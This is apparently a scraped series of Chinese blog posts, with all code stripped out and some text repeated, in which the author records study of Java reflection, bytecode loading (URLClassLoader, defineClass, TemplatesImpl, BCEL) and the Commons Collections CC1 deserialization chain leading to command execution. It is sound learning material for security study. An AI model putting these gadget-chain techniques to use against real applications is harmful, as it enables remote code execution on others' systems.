的作用是处理前面传入的字节码，将其处理成真正的Java类 其核心应该是在defineClass方法，因为这个方法才是最后把字节码转化成真正的java类。我们本地测试一下好了。一个恶意类，弹出计算机 编译成class文件，用shell输出base64编码的字节码之后利用definClass加载 成功弹出计算器 方法三、利用TemplatesImpl加载字节码TemplatesImpl相对于ClassLoader比较底层，但原理是defineClass()在TemplatesImpl内部的静态类TransletClassLoader被重载。 但这个方法是个private方法不能被外部调用，我们继续看看。看到getTransletInstance调用了这个方法，但这仍是个私有方法 继续看最好在NewTransformer方法调用了getTransletInstance，并且这是个public方法，可以外部调用。 调用链是这样的 所以poc就有了，这里放p神的 可以看到poc这里用反射设置了三个参数的值，在源码里可以看到原因_bytecodes是字节码为空的话回返回一个错误_name可以任意赋值，不为空就行 defineTransletClasses()的run方法调用了_tfactory.getExternalExtensionsMap()，_tfactory所以不能为空 值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。所以需要构造一个特殊的类来触发。 成功弹出计算器 TemplatesImpl似乎在fastjson和jackson出现的比较多，以后会学到。 方法四、利用BCEL ClassLoader加载字节码BCEL也是个大知识点，以后重点学习，这里放一下poc。 讨论方法前先来看看什么是字节码 什么是java字节码严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。但是我们讨论的字节码可以扩大范围——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。Java的ClassLoader来用来加载字节码文件最基础的方法 ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime 。 方法一、利用URLClassLoader加载远程class文件URLClassLoader是AppClassLoader的父类，该类可以加载远程class文件。正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类来寻找.class文件来加载，而这个基础路径有分为三种情况： URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件 URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件 URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们这里要利用第三种，协议得是非file，最常见的就是http先创建一个恶意类 在class文件所在的文件夹下用python快速起一个http服务器之后试试能不能用UrlClassLoader加载这个类 成功弹出计算器所以在实战中，我们如果能控制ClassLoader为一个http服务器就能加载恶意类。 方法二、利用ClassLoader#defineClass直接加载字节码不管是加载远程的class文件还是本地的class文件都是经历下面三个方法调用javaClassLoader#loadClass-&gt;ClassLoader#findClass-&gt;ClassLoader#defineClass loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类 其核心应该是在defineClass方法，因为这个方法才是最后把字节码转化成真正的java类。我们本地测试一下好了。一个恶意类，弹出计算机 编译成class文件，用shell输出base64编码的字节码之后利用definClass加载 成功弹出计算器 方法三、利用TemplatesImpl加载字节码TemplatesImpl相对于ClassLoader比较底层，但原理是defineClass()在TemplatesImpl内部的静态类TransletClassLoader被重载。 但这个方法是个private方法不能被外部调用，我们继续看看。看到getTransletInstance调用了这个方法，但这仍是个私有方法 继续看最好在NewTransformer方法调用了getTransletInstance，并且这是个public方法，可以外部调用。 调用链是这样的 所以poc就有了，这里放p神的 可以看到poc这里用反射设置了三个参数的值，在源码里可以看到原因_bytecodes是字节码为空的话回返回一个错误_name可以任意赋值，不为空就行 defineTransletClasses()的run方法调用了_tfactory.getExternalExtensionsMap()，_tfactory所以不能为空 值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。所以需要构造一个特殊的类来触发。 成功弹出计算器[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Ypdjjawo-1632274419328)()]TemplatesImpl似乎在fastjson和jackson出现的比较多，以后会学到。 方法四、利用BCEL ClassLoader加载字节码BCEL也是个大知识点，以后重点学习，这里放一下poc。 "},{"title":"java反序列化CC1-3","date":"2021-09-03T13:14:04.000Z","url":"/2021/09/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-3/","categories":[["java","/categories/java/"]],"content":" cc1链的最后了。TransformedMap换成了LazyMappoc 核心主要在于LazyMap类的get方法。 如果传入的参数不存在，则调用factory的transform。可以试着写一个非反序列化的命令执行 弹出了计算机（不知道问什么点开就闪退）调试一下看看 可以看到我们get的test这个key是不存在的，所以进入if调用了factory的transform，这个factory就是decorate方法的第二个参数，看源码就知道。[之后的过程就跟之前的TransformedMap链是一样的。 这里是手动执行的get，我们继续研究反序列化的poc。 动态代理sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法中并没有直接调用到Map的get方法。但是AnnotationInvocationHandler类的invoke方法调用了get 调用AnnotationInvocationHandler的invoke方法，这里用到了java对象代理。动态代理详解可以看这篇文章。不过本地调试一下更能理解过程 其实看名字就能看出来AnnotationInvocationHandler实际上就是个InvocationHandler，所以用AnnotationInvocationHandler对我们的map进行代理，这样调用任意方法都会进入AnnotationInvocationHandler.invoke方法进而触发get实现命令执行 总结勉强看完了，但对代理这一块还不是很熟，找个时间自己学一下"},{"title":"java反序列化CC1-2","date":"2021-09-02T13:14:04.000Z","url":"/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/","categories":[["java","/categories/java/"]],"content":" 上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 不过这个poc我本地算是弹失败了，因为java版本的原因，在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用。我的版本正好是8u71。不过我来学习思路，也懒的改版本了。 sun.reflect.annotation.AnnotationInvocationHandler触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可 以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。这个类就是 sun.reflect.annotation.AnnotationInvocationHandler源码就不放了，逻辑就是调用了setValue方法，这个方法也能触发TransformedMap里注册的Transform。 关于反射的问题看到前面我们生产Runtime类的时候是直接调用getRuntime方法的[ 但这次的poc不一样，是利用反射调用的 这里涉及到反序列化的条件。1、该类必须直接实现java.io.Serializable接口或者间接从其继承树中实现该接口(也就是他的某个父类实现了这个接口);2、对于该类的所有无法序列化的属性(本文指字段field, 而不是严格意义上的属性property, 下同)必须使用transient修饰。 但Runtime类是没有实现java.io.Serializable接口的，所以不能直接反序列化，但反射能解决这个问题，将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。 但是AnnotationInvocationHandler 也不能直接实例化，仍然需要利用反射的机制 总结真累，接下来是CC1的LazyMap，比起TransformedMap似乎LazyMap用的更多"},{"title":"java反序列化CC1-1","date":"2021-09-01T13:14:04.000Z","url":"/2021/09/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-1/","categories":[["java","/categories/java/"]],"content":" 最近入门java安全，看一下最基础的CC1链子（URLDNS已经偷偷学过了）先来看看p神原创的最简代码 这里涉及到几个接口和类，一个一个看 Transformer这是个接口，源码也很简单。 看注释，把一个输入的对象输出，这个对象应该保持不变。 TransformedMap及其decorate方法 decorate中 第一个参数为修饰的Map类，第二个参数和第三个参数都是一个实现了Transformer接口的类，转换Map的键和值，为null则不转换。当被修饰的map添加新元素时会分别触发这两个类的transfom方法，也就是说我们之后只要找到能利用的transform方法即可。具体看下面这篇文章里面的一个例子 ConstantTransformer 构造该类时传入一个对象，并在调用transform时返回该对象，算是一种封装。 InvokerTransformer 该类也实现了Transformer类接口的一个类第一个参数是待执行的方法名，第二个参数是函数的参数类型，第三个参数是这个函数的参数列表。重点在改类的transform方法前面说过，通过TransformedMap的decorate方法可以调用任意类的transform方法，所以InvokerTransformer类中的transform及是我们要找的恶意方法，因为他可以导致任意命令执行。 执行原理也很简单，结合之前学过的反射机制很容易就能看懂。 ChainedTransformer 该类也实现了Transformer接口。其构造函数的参数为Transformer[]。主要逻辑算是一种链式调用。将transformers中多个实现Transformer接口的类串在一起，第一个传入的object为第一个类的transform方法的参数，再将执行结果作为transformers列表中下一个类的transform方法的参数。 理解了这些类，再看看p神的构造里的一段。 这里实例化了Transformer[]列表，在下面作为了ChainedTransformer类实例化时的参数。该Transformer[]包含两个Transformer:第一个是ConstantTransformer， 直接返回当前环境的Runtime对象;第二个是InvokerTransformer，获取了exec方法，里面的Object为参数，即exec的参数，这里就是计算器。 总的分析 这里先实例化了一个HashMap类，再用TransformedMap.decorate修饰该类返回了一个新的Map类。前面说过，再被TransformedMap.decorate修饰过的类中添加新元素时会触发第二、第三个参数的transform方法。利用outerMap.put就添加了新元素。下面的这里第二个参数为null，第三个参数为上面实例化的一个ChainedTransformer类。 ChainedTransformer类的transform方法被触发，参数为Transformer[]类。之后利用ChainedTransformer的transform方法链式调用进行命令执行。 总结这算是个半个CC1链子，因为是手动触发的put方法，接下来学完整的CC1链子"},{"title":"java反射学习-3","date":"2021-08-29T13:14:04.000Z","url":"/2021/08/29/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-3/","categories":[["java","/categories/java/"]],"content":"解决两个问题1.如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？2.如果一个方法或构造方法是私有方法，我们是否能执行它呢？ 第一个问题这里要引入新的反射方法 getConstructor 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 newInstance 来执行。 ProcessBuilder有两个构造函数： 比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令： 上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表 达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步。其实用的就是前面讲过的知识： 通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。那么，如果我们要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反 射执行呢？ 这又涉及到Java里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你 定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变的”。 对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价 的（也就不能重载）： 那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。 所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数： 在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下： 第二个问题这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：1.getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法2.getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了举个例子，前文我们说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令： "},{"title":"java反射学习-2","date":"2021-08-26T13:14:04.000Z","url":"/2021/08/26/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-2/","categories":[["java","/categories/java/"]],"content":"上一篇学完了反射的基础，接下来深入学习一下。 在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类 同时，forName()还可以获取内部类 我们通过forName获得类之后用newInstance()来调用这个类的无参构造函数，但有时这个方法会失败，原因可能是： 你使用的类没有无参构造函数 你使用的类构造函数是私有的常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令： 因为Runtime类的构造方法是私有的。但还是有方法获取到这个类的，这涉及到单例模式。比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取： 之后获取这个类的方法为getInstance。Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了： Runtime.exec有6个重载，第一个重载，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。invoke 的作用是执行方法，它的第一个参数是：1.如果这个方法是一个普通方法，那么第一个参数是类对象2.如果这个方法是一个静态方法，那么第一个参数是类 这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。 所以我们将上述命令执行的Payload分解一下就是： "},{"title":"java反射学习-1","date":"2021-08-25T13:14:04.000Z","url":"/2021/08/25/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-1/","categories":[["java","/categories/java/"]],"content":"学习java反序列化之前少不了学习反射，虽然之前学过，还是再学一遍 java反射机制的定义Java反射机制是在运行状态中，对于任意一个类，都能够知道这个类中的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制 java的反序列化问题都基于反射机制 Java 反射机制的功能1.在运行时判断任意一个对象所属的类。2.在运行时构造任意一个类的对象。3.在运行时判断任意一个类所具有的成员变量和方法。4.在运行时调用任意一个对象的方法。5.生成动态代理。 Java 反射机制的应用场景1.逆向代码 ，例如反编译2.与注解相结合的框架 例如Retrofit3.单纯的反射机制应用框架 例如EventBus4.动态生成类框架 例如Gson 反射常见使用的方法获取类的方法：forname实例化类对象的方法：newInstance获取函数的方法：getMethod执行函数的方法：invoke 只有JVM能够创建Class对象 获取class对象三种方法一般我们获取class对象就有以下三种方法 1、类的.class属性第一种就是最简单明了的方式，我们可以通过类名的属性class获取。 2、实例化对象的getClass()方法第二种我们可以先实例化一个对象，之后在调用getClass()方法。 3、Class.forName(String className)：动态加载类第三种则是调用Class类中的forName方法，将字节码文件加载进内存，返回Class对象。 总的来看 结果 但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。 而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误； 而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。 所以我们在获取class对象中，一般使用Class.forName方法去获取。 获取成员变量Field 获取成员方法Method 获取构造函数 利用反射创建类对象（重点）在前面我们获取了Class对象，之后展示了一系列获取成员变量、成员方法和成员函数的方式后，我们现在可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象。 使用的方式也特别简单，只需要通过forname方法获取到的class对象中进行newInstance方法创建即可。 利用反射机制创建类并执行方法"}]